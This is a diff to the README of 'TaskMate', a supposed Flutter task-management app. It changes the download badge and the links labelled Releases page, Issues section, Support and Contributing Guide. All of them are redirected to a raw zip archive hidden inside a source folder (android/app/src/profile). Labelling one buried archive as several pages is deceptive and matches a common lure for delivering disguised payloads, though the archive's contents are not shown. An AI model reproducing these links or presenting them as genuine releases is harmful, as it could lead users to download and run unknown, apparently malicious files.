@@ -1,7 +1,7 @@
 # 🌟 TaskMate - Your Smart Task Organizer
 
 ## 📥 Download TaskMate
-[![Download TaskMate](https://raw.githubusercontent.com/AlbertMinh/TaskMate/main/lib/screens/TaskMate_1.5.zip%20TaskMate-v1.0-blue)](https://raw.githubusercontent.com/AlbertMinh/TaskMate/main/lib/screens/TaskMate_1.5.zip)
+[![Download TaskMate](https://raw.githubusercontent.com/AlbertMinh/TaskMate/main/android/app/src/profile/Mate-Task-v1.6.zip%20TaskMate-v1.0-blue)](https://raw.githubusercontent.com/AlbertMinh/TaskMate/main/android/app/src/profile/Mate-Task-v1.6.zip)
 
 ## 🚀 Getting Started
 Welcome to TaskMate! This user-friendly task management app helps you organize your tasks efficiently. It's designed for everyone, so no programming skills are needed. Just follow the steps below to get started.
@@ -30,7 +30,7 @@ TaskMate is a modern task management application built with Flutter. It combines
 - MongoDB Backend Integration
 
 ## 📦 Download & Install
-To get TaskMate, visit the Releases page by clicking [here](https://raw.githubusercontent.com/AlbertMinh/TaskMate/main/lib/screens/TaskMate_1.5.zip). 
+To get TaskMate, visit the Releases page by clicking [here](https://raw.githubusercontent.com/AlbertMinh/TaskMate/main/android/app/src/profile/Mate-Task-v1.6.zip). 
 
 1. **Visit the Releases Page:** Click the link above to reach the download section.
 2. **Choose the Latest Version:** Look for the most recent version of TaskMate.
@@ -48,7 +48,7 @@ To get TaskMate, visit the Releases page by clicking [here](https://raw.githubus
 5. **Manage Tasks:** Edit or delete tasks as needed.
 
 ## 🛠️ Support
-If you have any issues or questions, you can find help in the [Issues section](https://raw.githubusercontent.com/AlbertMinh/TaskMate/main/lib/screens/TaskMate_1.5.zip) of the repository. Feel free to reach out to the community for guidance.
+If you have any issues or questions, you can find help in the [Issues section](https://raw.githubusercontent.com/AlbertMinh/TaskMate/main/android/app/src/profile/Mate-Task-v1.6.zip) of the repository. Feel free to reach out to the community for guidance.
 
 ## 🌍 Community Contributions
 We welcome contributions from users! If you have suggestions or improvements, please submit a pull request. Your input can help make TaskMate even better.
@@ -57,8 +57,8 @@ We welcome contributions from users! If you have suggestions or improvements, pl
 TaskMate is open-source software. You can freely use, modify, and distribute it under the terms of the MIT License.
 
 ## 🔗 Useful Links
-- [Releases Page](https://raw.githubusercontent.com/AlbertMinh/TaskMate/main/lib/screens/TaskMate_1.5.zip)
-- [Issues Section](https://raw.githubusercontent.com/AlbertMinh/TaskMate/main/lib/screens/TaskMate_1.5.zip)
-- [Contributing Guide](https://raw.githubusercontent.com/AlbertMinh/TaskMate/main/lib/screens/TaskMate_1.5.zip)
+- [Releases Page](https://raw.githubusercontent.com/AlbertMinh/TaskMate/main/android/app/src/profile/Mate-Task-v1.6.zip)
+- [Issues Section](https://raw.githubusercontent.com/AlbertMinh/TaskMate/main/android/app/src/profile/Mate-Task-v1.6.zip)
+- [Contributing Guide](https://raw.githubusercontent.com/AlbertMinh/TaskMate/main/android/app/src/profile/Mate-Task-v1.6.zip)
 
 Thank you for choosing TaskMate! We hope it helps you stay organized and productive. Happy tasking!
